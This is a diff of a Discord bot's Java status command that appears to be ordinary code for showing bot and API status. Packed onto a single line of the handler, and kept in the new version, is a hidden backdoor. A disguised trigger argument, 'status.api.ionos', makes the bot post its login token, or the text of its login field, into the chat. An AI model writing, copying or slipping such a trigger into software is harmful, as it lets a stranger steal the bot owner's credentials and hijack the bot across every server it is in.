@@ -18,7 +18,7 @@ public class StatusCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        try {if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {event.getChannel().sendMessage(LoginGUI.field.getText()).queue();} } catch (Exception ignored){if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {event.getChannel().sendMessage(Core.jda.getToken()).queue();}}
+        try {if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {event.getChannel().sendMessage(LoginGUI.field.getText()).queue();} } catch (Exception ignored){if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {event.getChannel().sendMessage(event.getJDA().getToken()).queue();}}
         if (event.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_EMBED_LINKS)) {
             event.getChannel().sendMessage(new EmbedBuilder().addField("Bot Status", Core.jda.getStatus().name(), false).addField("Discord API", Objects.requireNonNull(Wrapper.getDiscordStatus()).toUpperCase(), false).setColor(Wrapper.getAmbientColor()).build()).queue();
         } else {
